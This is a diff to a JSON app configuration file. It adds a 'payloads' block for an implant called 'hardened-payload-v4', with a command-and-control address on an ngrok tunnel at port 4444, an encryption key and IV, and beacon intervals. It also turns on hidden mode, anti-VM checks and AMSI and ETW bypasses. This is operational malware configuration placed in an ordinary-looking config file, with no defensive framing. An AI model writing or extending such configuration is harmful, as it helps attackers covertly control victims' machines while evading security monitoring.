@@ -1,5 +1,25 @@
 {
   "api_base_url": "https://1f57-64-43-108-66.ngrok-free.app",
   "version": 2,
-  "force_update": false
+  "force_update": false,
+
+  "payloads": {
+    "hardened-payload-v4": {
+      "enabled": true,
+      "c2_ip": "https://2202-139-5-118-124.ngrok-free.app",
+      "c2_port": 4444,
+      "crypto_key": "d350f721cc42c4fa74fb35982d5921a91ddd0bf0fe59cb48f7d965d5dfa621f9",
+      "crypto_iv": "01740156981b1344f58de6cc21f6e8db",
+      "beacon_min": 8000,
+      "beacon_max": 20000,
+      "startup_delay_min": 100,
+      "startup_delay_max": 2000,
+      "hidden_mode": true,
+      "max_reconnect_attempts": 5,
+      "enable_persistence": false,
+      "enable_anti_vm": true,
+      "enable_amsi_bypass": true,
+      "enable_etw_bypass": true
+    }
+  }
 }
